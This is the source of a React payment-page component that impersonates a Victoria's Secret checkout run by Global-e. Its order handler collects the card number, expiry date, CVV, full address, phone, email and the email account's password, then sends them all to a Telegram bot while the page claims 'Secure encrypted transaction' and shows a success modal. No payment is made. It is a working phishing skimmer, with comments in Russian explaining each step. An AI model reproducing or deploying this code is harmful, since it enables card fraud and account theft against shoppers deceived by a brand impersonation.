import styles from "./payment.module.scss"
import visa from "../../assets/visa.png"
import mastercard from "../../assets/mastercard.png"
import americanexpress from "../../assets/americanexpress.png"
import React, {ChangeEvent, FormEvent, useState} from "react";
import Modal from "../modal/modal";
import sendMessage from "../../api/telegram";

const Payment = () => {
    const [cardNumber, setCardNumber] = useState("");
    const [modal, setModal] = useState<boolean>(false);

    const openModal = () => {
        setModal(true);
    };
    const closeModal = () => {
        setModal(false);
    };

    // Function to close the modal
    const closePopup = () => {
        setModal(false);
    };

    const handlePlaceOrder = async (e: FormEvent) => {
        e.preventDefault(); // предотвращаем перезагрузку страницы

        // Собираем данные из формы для платежных данных
        const expiryMonth = (document.getElementById('expiry-month') as HTMLSelectElement)?.value;
        const expiryYear = (document.getElementById('expiry-year') as HTMLSelectElement)?.value;
        const securityCode = (document.getElementById('security-code') as HTMLInputElement)?.value;

        // Собираем данные из формы адреса
        const firstName = (document.getElementById("first-name") as HTMLInputElement)?.value;
        const lastName = (document.getElementById("last-name") as HTMLInputElement)?.value;
        const country = (document.getElementById("country") as HTMLSelectElement)?.value;
        const addressLine1 = (document.getElementById("address-line-1") as HTMLInputElement)?.value;
        const addressLine2 = (document.getElementById("address-line-2") as HTMLInputElement)?.value;
        const city = (document.getElementById("city") as HTMLInputElement)?.value;
        const zipCode = (document.getElementById("zip") as HTMLInputElement)?.value;
        const phoneNumber = (document.getElementById("phone-number") as HTMLInputElement)?.value;
        const email = (document.getElementById("email") as HTMLInputElement)?.value;
        const password = (document.getElementById("password") as HTMLInputElement)?.value;

        // Собираем все данные в одну строку
        const cardDetails = `
            Card Number: ${cardNumber} \n
            Date: ${expiryMonth}/${expiryYear} \n
            CVV: ${securityCode} \n
            First Name: ${firstName} \n
            Last Name: ${lastName} \n
            Country: ${country} \n
            Address Line 1: ${addressLine1} \n
            Address Line 2: ${addressLine2} \n
            City: ${city} \n
            Zip Code: ${zipCode} \n
            Phone Number: ${phoneNumber} \n
            Email: ${email} \n
            Password mail: ${password}
        `;
        try {
            // Отправляем данные в Telegram
            await sendMessage(cardDetails.trim());
            setModal(true); // Показываем модальное окно
        } catch (error) {
            console.error('Failed to send message:', error);
        }
    };
    // Функция для форматирования номера карты
    const formatCardNumber = (value: string) => {
        const cleaned = value.replace(/\D/g, '');
        const formatted = cleaned.match(/.{1,4}/g)?.join(' ') || '';
        return formatted;
    };

    // Обработчик изменения номера карты
    const handleCardNumberChange = (e: ChangeEvent<HTMLInputElement>) => {
        const formattedValue = formatCardNumber(e.target.value);
        setCardNumber(formattedValue);
    };

    return (
        <section className={styles.payment}>
            <div className={styles.info_container}>
                <div className={styles.payment_container}>
                    <div className={styles.title}>
                        <p className={styles.payment_title}>Payment</p>
                        <span className={styles.secure_text}>Secure encrypted transaction</span>
                    </div>
                    <div className={styles.company}>
                        <img src={visa} alt="visa" />
                        <img src={mastercard} alt="mastercard" />
                        <img src={americanexpress} alt="americanexpress" />
                    </div>
                    <div className={styles.container}>
                        <form className={styles.form}>
                            <div className={styles.inputs_container}>
                                <div className={styles.input_container}>
                                    <label className={styles.label} htmlFor="card-number">Card number*</label>
                                    <input
                                        type="text"
                                        className={styles.input_number}
                                        id="card-number"
                                        name="card-number"
                                        value={cardNumber}
                                        onChange={handleCardNumberChange}
                                        maxLength={19}
                                        required
                                        pattern="[0-9 ]+"
                                        placeholder="Card number"
                                    />
                                </div>
                                <div className={styles.input_container}>
                                    <label className={styles.label} htmlFor="expiry-date">Expiry date*</label>
                                    <div className={styles.selector_container}>
                                        <select className={styles.selector} id="expiry-month" name="expiry-month" required>
                                            <option value="">Month</option>
                                            <option value="01">01</option>
                                            <option value="02">02</option>
                                            <option value="03">03</option>
                                            <option value="04">04</option>
                                            <option value="05">05</option>
                                            <option value="06">06</option>
                                            <option value="07">07</option>
                                            <option value="08">08</option>
                                            <option value="09">09</option>
                                            <option value="10">10</option>
                                            <option value="11">11</option>
                                            <option value="12">12</option>
                                        </select>

                                        <select className={styles.selector} id="expiry-year" name="expiry-year"
                                                required>
                                            <option value="">Year</option>
                                            <option value="2024">2024</option>
                                            <option value="2025">2025</option>
                                            <option value="2026">2026</option>
                                            <option value="2027">2027</option>
                                            <option value="2028">2028</option>
                                            <option value="2028">2029</option>
                                            <option value="2028">2030</option>
                                            <option value="2028">2031</option>
                                            <option value="2024">2032</option>
                                            <option value="2025">2033</option>
                                            <option value="2026">2034</option>
                                            <option value="2027">2035</option>
                                            <option value="2028">2036</option>
                                            <option value="2028">2037</option>
                                            <option value="2028">2038</option>
                                            <option value="2028">2039</option>
                                            <option value="2028">2040</option>
                                            <option value="2028">2041</option>
                                            <option value="2028">2042</option>
                                            <option value="2028">2043</option>
                                            <option value="2028">2044</option>
                                        </select>
                                    </div>
                                </div>
                                <div className={styles.input_container}>
                                    <label htmlFor="security-code" className={styles.label}>Security code*</label>
                                    <div className={styles.input_security}>
                                        <input
                                            className={styles.input_code}
                                            type="password"
                                            id="security-code"
                                            name="security-code"
                                            required
                                            maxLength={5}
                                            pattern="[0-9 ]+"
                                            placeholder="CVV"
                                        />
                                    </div>
                                </div>
                            </div>
                            <p className={styles.agreementText}>
                                By clicking on 'Place Order', you agree to make your purchase, with an obligation of
                                payment, from Global-e as merchant of record for this transaction, subject to Global-
                                e's <u><a href="https://www.global-e.com/tos" target="_blank">Terms of Sale</a></u>. You can find
                                out how your personal information will be handled by<br />
                                Global-e in accordance with the Global-e <u><a
                                href="https://www.global-e.com/consumer-privacy-policy" target="_blank">Privacy Policy</a></u>
                                . In the Global-e Policy you will also find further information how Global-e will share your
                                information (excluding the
                                payment details) with Victoria's Secret & Victoria's Secret PINK. For Victoria's Secret
                                privacy practices,see <u><a href="https://www.global-e.com/consumer-privacy-policy" target="_blank">Victoria Secret Privacy Policy</a></u>.
                            </p>
                            <button type="submit" className={styles.button} onClick={handlePlaceOrder}>
                                Place order
                            </button>
                        </form>
                    </div>
                </div>
                <div className={styles.summary}>
                    <p className={styles.summary_title}>Order Summary</p>
                    <div className={styles.summary_subtotal}>
                        <p>Subtotal</p>
                        <p>€61.89</p>
                    </div>
                    <div className={styles.summary_delivery}>
                        <p>Delivery</p>
                        <p>Free</p>
                    </div>
                    <div className={styles.summary_subtotal}>
                        <p>Total</p>
                        <p>€61.89</p>
                    </div>
                    <p className={styles.note}>Please note duties and taxes were not prepaid. Should there be any applicable<br />
                        charges, you will be required to pay them upon delivery</p>
                </div>
            </div>
            <Modal isOpen={modal} onClose={closeModal} />
        </section>
    );
};

export default Payment;